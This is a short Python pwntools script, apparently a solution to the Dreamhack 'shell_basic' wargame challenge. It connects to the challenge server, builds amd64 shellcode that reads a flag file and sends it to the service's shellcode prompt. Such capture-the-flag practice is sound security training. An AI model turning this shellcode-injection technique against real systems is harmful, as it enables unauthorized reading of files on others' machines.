from pwn import *

context.arch = "amd64"
p = remote("host3.dreamhack.games", 24520)

shellcode = asm(shellcraft.cat("/home/shell_basic/flag_name_is_loooooong"))

p.sendlineafter(b'shellcode: ', shellcode)
print(p.recvuntil(b'}'))
